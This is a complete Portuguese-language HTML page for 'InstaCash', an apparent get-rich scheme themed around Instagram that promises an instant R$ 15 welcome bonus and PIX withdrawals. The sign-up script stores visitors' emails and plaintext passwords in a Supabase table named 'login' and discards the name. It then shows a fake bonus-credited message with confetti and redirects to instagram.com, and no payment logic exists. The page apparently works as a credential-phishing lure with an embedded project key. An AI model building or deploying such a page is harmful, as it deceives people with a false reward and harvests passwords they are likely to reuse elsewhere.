<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
  <title>InstaCash • Ganhe Dinheiro no Instagram</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0a0a0f;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      position: relative;
      overflow-x: hidden;
    }

    /* Grade de fundo animada */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: 
        linear-gradient(rgba(139, 92, 246, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(139, 92, 246, 0.03) 1px, transparent 1px);
      background-size: 60px 60px;
      animation: gridMove 20s linear infinite;
      pointer-events: none;
      z-index: 0;
    }

    @keyframes gridMove {
      0% { transform: translate(0, 0); }
      100% { transform: translate(60px, 60px); }
    }

    /* Orbes de luz */
    .orb {
      position: fixed;
      border-radius: 50%;
      filter: blur(120px);
      pointer-events: none;
      z-index: 0;
    }

    .orb-1 {
      width: 600px;
      height: 600px;
      background: rgba(139, 92, 246, 0.15);
      top: -200px;
      right: -200px;
      animation: float1 15s ease-in-out infinite;
    }

    .orb-2 {
      width: 500px;
      height: 500px;
      background: rgba(236, 72, 153, 0.1);
      bottom: -150px;
      left: -150px;
      animation: float2 18s ease-in-out infinite;
    }

    .orb-3 {
      width: 400px;
      height: 400px;
      background: rgba(34, 211, 238, 0.08);
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      animation: float3 12s ease-in-out infinite;
    }

    @keyframes float1 {
      0%, 100% { transform: translate(0, 0) scale(1); }
      50% { transform: translate(-100px, 50px) scale(1.1); }
    }

    @keyframes float2 {
      0%, 100% { transform: translate(0, 0) scale(1); }
      50% { transform: translate(80px, -60px) scale(0.9); }
    }

    @keyframes float3 {
      0%, 100% { transform: translate(-50%, -50%) scale(1); }
      50% { transform: translate(-40%, -60%) scale(1.15); }
    }

    .main-card {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 440px;
      background: rgba(15, 15, 25, 0.8);
      backdrop-filter: blur(40px);
      -webkit-backdrop-filter: blur(40px);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 2.5rem;
      padding: 2.5rem 2rem;
      box-shadow: 
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 0 1px rgba(139, 92, 246, 0.1) inset,
        0 0 100px rgba(139, 92, 246, 0.05);
    }

    /* Cabeçalho */
    .header {
      text-align: center;
      margin-bottom: 2rem;
    }

    .logo-wrapper {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      margin-bottom: 0.5rem;
    }

    .logo-icon {
      width: 44px;
      height: 44px;
      background: linear-gradient(135deg, #8b5cf6, #ec4899);
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4);
      animation: pulse 3s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% { box-shadow: 0 8px 32px rgba(139, 92, 246, 0.4); }
      50% { box-shadow: 0 8px 48px rgba(236, 72, 153, 0.6); }
    }

    .brand-name {
      font-size: 1.8rem;
      font-weight: 800;
      background: linear-gradient(135deg, #c4b5fd, #f9a8d4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: -0.5px;
    }

    .tagline {
      color: #94a3b8;
      font-size: 0.9rem;
      font-weight: 500;
      margin-top: 0.3rem;
      letter-spacing: 0.3px;
    }

    /* Card de bônus */
    .bonus-card {
      background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(139, 92, 246, 0.1));
      border: 1px solid rgba(34, 197, 94, 0.3);
      border-radius: 2rem;
      padding: 2rem 1.5rem;
      text-align: center;
      margin-bottom: 2rem;
      position: relative;
      overflow: hidden;
    }

    .bonus-card::before {
      content: "";
      position: absolute;
      inset: 0;
      background: linear-gradient(135deg, transparent, rgba(34, 197, 94, 0.05));
      pointer-events: none;
    }

    .bonus-icon {
      width: 56px;
      height: 56px;
      background: linear-gradient(135deg, #22c55e, #16a34a);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1rem;
      box-shadow: 0 8px 32px rgba(34, 197, 94, 0.3);
    }

    .bonus-amount {
      font-size: 3.5rem;
      font-weight: 800;
      background: linear-gradient(135deg, #4ade80, #a78bfa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      line-height: 1;
      letter-spacing: -2px;
      transition: transform 0.15s ease;
    }

    .bonus-label {
      color: #86efac;
      font-size: 0.9rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-top: 0.5rem;
    }

    .bonus-subtitle {
      color: #64748b;
      font-size: 0.8rem;
      margin-top: 0.3rem;
      font-weight: 500;
    }

    /* Seção de cadastro */
    .register-section {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 1.5rem;
      padding: 1.5rem;
    }

    .register-title {
      color: #e2e8f0;
      font-weight: 700;
      font-size: 1rem;
      margin-bottom: 1.2rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 0.9rem;
      margin-bottom: 1.2rem;
    }

    .input-field {
      background: rgba(10, 8, 20, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 1rem;
      padding: 0.9rem 1.2rem;
      color: white;
      font-size: 0.95rem;
      outline: none;
      transition: 0.2s;
      font-weight: 500;
    }

    .input-field:focus {
      border-color: #8b5cf6;
      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
    }

    .input-field::placeholder {
      color: #52525b;
      font-weight: 400;
    }

    .btn-register {
      width: 100%;
      padding: 1rem;
      background: linear-gradient(135deg, #8b5cf6, #ec4899);
      border: none;
      border-radius: 1.2rem;
      color: white;
      font-size: 1.1rem;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.6rem;
      transition: all 0.3s;
      box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
      letter-spacing: 0.3px;
    }

    .btn-register:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 15px 40px rgba(139, 92, 246, 0.6);
      filter: brightness(1.1);
    }

    .btn-register:active:not(:disabled) {
      transform: translateY(0);
    }

    .btn-register:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .feedback-message {
      text-align: center;
      font-size: 0.85rem;
      font-weight: 500;
      min-height: 1.5rem;
      margin-top: 0.8rem;
      transition: all 0.3s;
    }

    .feedback-success {
      color: #4ade80;
    }

    .feedback-error {
      color: #f87171;
    }

    .feedback-loading {
      color: #a78bfa;
    }

    /* Benefícios */
    .benefits-row {
      display: flex;
      gap: 0.6rem;
      margin-top: 1.5rem;
    }

    .benefit-box {
      flex: 1;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.06);
      border-radius: 1rem;
      padding: 0.8rem;
      text-align: center;
      transition: all 0.3s;
    }

    .benefit-box:hover {
      background: rgba(255, 255, 255, 0.05);
      border-color: rgba(139, 92, 246, 0.2);
    }

    .benefit-icon {
      color: #a78bfa;
      margin-bottom: 0.4rem;
    }

    .benefit-value {
      color: #f1f5f9;
      font-weight: 700;
      font-size: 1rem;
    }

    .benefit-label {
      color: #64748b;
      font-size: 0.65rem;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 0.2rem;
    }

    /* Footer */
    .footer-text {
      text-align: center;
      color: #475569;
      font-size: 0.75rem;
      margin-top: 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.3rem;
    }

    /* Loading spinner */
    .spinner {
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    @keyframes slideUp {
      from { transform: translateX(-50%) translateY(20px); opacity: 0; }
      to { transform: translateX(-50%) translateY(0); opacity: 1; }
    }

    @keyframes slideDown {
      from { transform: translateX(-50%) translateY(0); opacity: 1; }
      to { transform: translateX(-50%) translateY(20px); opacity: 0; }
    }

    /* Confete */
    .confetti-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 1000;
    }

    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      border-radius: 2px;
      animation: confettiFall 3s ease-out forwards;
    }

    @keyframes confettiFall {
      0% {
        transform: translateY(-100%) rotate(0deg);
        opacity: 1;
      }
      100% {
        transform: translateY(100vh) rotate(720deg);
        opacity: 0;
      }
    }

    @media (max-width: 400px) {
      .main-card {
        padding: 2rem 1.2rem;
      }
      .bonus-amount {
        font-size: 2.8rem;
      }
    }
  </style>
</head>
<body>
  <!-- Orbes decorativas -->
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>

  <!-- Container de confetes -->
  <div class="confetti-container" id="confettiContainer"></div>

  <div class="main-card">
    <!-- Cabeçalho -->
    <div class="header">
      <div class="logo-wrapper">
        <div class="logo-icon">
          <i data-lucide="gift" style="color: white;" width="24" height="24"></i>
        </div>
        <span class="brand-name">InstaCash</span>
      </div>
      <p class="tagline">Ganhe dinheiro real com o Instagram</p>
    </div>

    <!-- Card de bônus de boas-vindas -->
    <div class="bonus-card">
      <div class="bonus-icon">
        <i data-lucide="sparkles" style="color: white;" width="28" height="28"></i>
      </div>
      <div class="bonus-amount">R$ 15,00</div>
      <div class="bonus-label">🎉 Bônus de Boas-Vindas</div>
      <div class="bonus-subtitle">Crédito instantâneo ao se cadastrar</div>
    </div>

    <!-- Seção de cadastro -->
    <div class="register-section">
      <div class="register-title">
        <i data-lucide="user-plus" width="20" height="20" style="color: #a78bfa;"></i>
        Criar sua conta
      </div>
      <div class="input-group">
        <input 
          type="text" 
          id="nameInput" 
          class="input-field" 
          placeholder="Nome completo"
          autocomplete="off"
        >
        <input 
          type="email" 
          id="emailInput" 
          class="input-field" 
          placeholder="Email"
          autocomplete="off"
        >
        <input 
          type="password" 
          id="passwordInput" 
          class="input-field" 
          placeholder="Senha"
          autocomplete="off"
        >
      </div>
      <button class="btn-register" id="registerButton">
        <i data-lucide="user-check" width="20" height="20"></i>
        Cadastrar e garantir bônus
      </button>
      <div id="feedbackMessage" class="feedback-message"></div>
    </div>

    <!-- Benefícios -->
    <div class="benefits-row">
      <div class="benefit-box">
        <div class="benefit-icon">
          <i data-lucide="zap" width="20" height="20"></i>
        </div>
        <div class="benefit-value">R$ 15</div>
        <div class="benefit-label">Bônus</div>
      </div>
      <div class="benefit-box">
        <div class="benefit-icon">
          <i data-lucide="smartphone" width="20" height="20"></i>
        </div>
        <div class="benefit-value">Fácil</div>
        <div class="benefit-label">Tarefas</div>
      </div>
      <div class="benefit-box">
        <div class="benefit-icon">
          <i data-lucide="banknote" width="20" height="20"></i>
        </div>
        <div class="benefit-value">PIX</div>
        <div class="benefit-label">Saque</div>
      </div>
    </div>

    <!-- Footer -->
    <div class="footer-text">
      <i data-lucide="shield-check" width="14" height="14" style="color: #4ade80;"></i>
      Seus dados estão seguros • Suporte 24h
    </div>
  </div>

  <script>
    (function() {
      // Inicializar ícones Lucide
      lucide.createIcons();

      // ---------- CONFIGURAÇÃO DO SUPABASE ----------
      const SUPABASE_URL = "https://wlrclbwjqmnzgabiurmr.supabase.co";
      const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndscmNsYndqcW1uemdhYml1cm1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg3MTU0MDMsImV4cCI6MjA5NDI5MTQwM30.-0LQBgpjjYuV7hnRiIXNMCJ9GIJrYWd7pABgcPtGfPM";

      // Inicializa o cliente Supabase
      const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

      // Estado
      let isProcessing = false;

      // Elementos
      const registerButton = document.getElementById('registerButton');
      const nameInput = document.getElementById('nameInput');
      const emailInput = document.getElementById('emailInput');
      const passwordInput = document.getElementById('passwordInput');
      const feedbackDiv = document.getElementById('feedbackMessage');
      const confettiContainer = document.getElementById('confettiContainer');

      // Função para criar confetes
      function createConfetti() {
        const colors = ['#8b5cf6', '#ec4899', '#22c55e', '#fbbf24', '#3b82f6', '#f472b6', '#a78bfa'];
        
        for (let i = 0; i < 80; i++) {
          const confetti = document.createElement('div');
          confetti.className = 'confetti';
          confetti.style.left = Math.random() * 100 + '%';
          confetti.style.top = -(Math.random() * 20) + '%';
          confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
          confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
          confetti.style.animationDelay = Math.random() * 0.5 + 's';
          confetti.style.width = (Math.random() * 8 + 6) + 'px';
          confetti.style.height = (Math.random() * 8 + 6) + 'px';
          confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
          
          confettiContainer.appendChild(confetti);
          
          // Remover confete após a animação
          setTimeout(() => {
            confetti.remove();
          }, 3000);
        }
      }

      // Toast notification
      function showToast(message, type = 'success') {
        const toast = document.createElement('div');
        toast.style.cssText = `
          position: fixed;
          bottom: 30px;
          left: 50%;
          transform: translateX(-50%);
          background: rgba(15, 15, 25, 0.95);
          backdrop-filter: blur(20px);
          border: 1px solid ${type === 'success' ? 'rgba(34, 197, 94, 0.4)' : 'rgba(239, 68, 68, 0.4)'};
          color: #e2e8f0;
          padding: 1rem 1.5rem;
          border-radius: 2rem;
          font-weight: 600;
          font-size: 0.9rem;
          z-index: 1000;
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
          animation: slideUp 0.3s ease-out;
          pointer-events: none;
        `;
        toast.textContent = message;
        document.body.appendChild(toast);

        setTimeout(() => {
          toast.style.animation = 'slideDown 0.3s ease-in';
          setTimeout(() => toast.remove(), 300);
        }, 3000);
      }

      // Salvar cadastro no Supabase
      async function saveRegistration(name, email, password) {
        try {
          const { data, error } = await supabase
            .from('login')
            .insert([
              {
                login: email.trim(),
                senha: password.trim(),
                // Você pode adicionar mais colunas se quiser
                // nome: name.trim()
              }
            ])
            .select();

          if (error) {
            console.error('Erro Supabase:', error);
            
            if (error.code === '42P01') {
              throw new Error('Erro no banco de dados. Tente novamente.');
            } else if (error.code === '42501') {
              throw new Error('Erro de permissão. Contate o suporte.');
            } else if (error.code === '23505') {
              throw new Error('Este email já está cadastrado.');
            } else if (error.message.includes('Failed to fetch')) {
              throw new Error('Erro de conexão. Verifique sua internet.');
            } else {
              throw new Error('Erro ao cadastrar. Tente novamente.');
            }
          }

          return { success: true, data };
        } catch (err) {
          console.error('Erro:', err);
          return { success: false, message: err.message };
        }
      }

      // Botão de cadastro
      registerButton.addEventListener('click', async () => {
        const name = nameInput.value;
        const email = emailInput.value;
        const password = passwordInput.value;

        // Validação
        if (!name.trim()) {
          feedbackDiv.textContent = '⚠️ Informe seu nome completo';
          feedbackDiv.className = 'feedback-message feedback-error';
          nameInput.focus();
          return;
        }

        if (!email.trim()) {
          feedbackDiv.textContent = '⚠️ Informe seu email';
          feedbackDiv.className = 'feedback-message feedback-error';
          emailInput.focus();
          return;
        }

        if (!isValidEmail(email.trim())) {
          feedbackDiv.textContent = '⚠️ Informe um email válido';
          feedbackDiv.className = 'feedback-message feedback-error';
          emailInput.focus();
          return;
        }

        if (!password.trim()) {
          feedbackDiv.textContent = '⚠️ Crie uma senha';
          feedbackDiv.className = 'feedback-message feedback-error';
          passwordInput.focus();
          return;
        }

        if (password.trim().length < 4) {
          feedbackDiv.textContent = '⚠️ A senha deve ter no mínimo 4 caracteres';
          feedbackDiv.className = 'feedback-message feedback-error';
          passwordInput.focus();
          return;
        }

        if (isProcessing) return;

        // Iniciar processamento
        isProcessing = true;
        registerButton.disabled = true;
        registerButton.innerHTML = `
          <i data-lucide="loader-2" width="20" height="20" class="spinner"></i>
          Cadastrando...
        `;
        lucide.createIcons();
        
        feedbackDiv.textContent = 'Salvando seus dados...';
        feedbackDiv.className = 'feedback-message feedback-loading';

        // Salvar no Supabase
        const result = await saveRegistration(name, email, password);

        if (result.success) {
          // Sucesso!
          feedbackDiv.textContent = '✅ Cadastro realizado! Bônus de R$ 15,00 ativado!';
          feedbackDiv.className = 'feedback-message feedback-success';
          
          // Criar confetes
          createConfetti();
          
          // Toast de sucesso
          showToast('🎉 Parabéns! Você ganhou R$ 15,00 de bônus!', 'success');
          
          // Limpar campos
          nameInput.value = '';
          emailInput.value = '';
          passwordInput.value = '';
          
          // Restaurar botão após um delay
          setTimeout(() => {
            isProcessing = false;
            registerButton.disabled = false;
            registerButton.innerHTML = `
              <i data-lucide="user-check" width="20" height="20"></i>
              Cadastrar e garantir bônus
            `;
            lucide.createIcons();
            feedbackDiv.textContent = '';
            feedbackDiv.className = 'feedback-message';
          }, 2500);
          
          // Redirecionar para o Instagram após 2 segundos
          setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
          }, 2000);
          
        } else {
          // Erro
          feedbackDiv.textContent = `❌ ${result.message}`;
          feedbackDiv.className = 'feedback-message feedback-error';
          showToast(result.message, 'error');
          
          // Restaurar botão
          isProcessing = false;
          registerButton.disabled = false;
          registerButton.innerHTML = `
            <i data-lucide="user-check" width="20" height="20"></i>
            Cadastrar e garantir bônus
          `;
          lucide.createIcons();
        }
      });

      // Validação de email
      function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }

      // Suporte para tecla Enter
      passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          registerButton.click();
        }
      });

      emailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          passwordInput.focus();
        }
      });

      nameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          emailInput.focus();
        }
      });

      // Animação inicial do bônus
      const bonusAmount = document.querySelector('.bonus-amount');
      if (bonusAmount) {
        setTimeout(() => {
          bonusAmount.style.transform = 'scale(1.05)';
          setTimeout(() => {
            bonusAmount.style.transform = 'scale(1)';
          }, 200);
        }, 500);
      }
    })();
  </script>
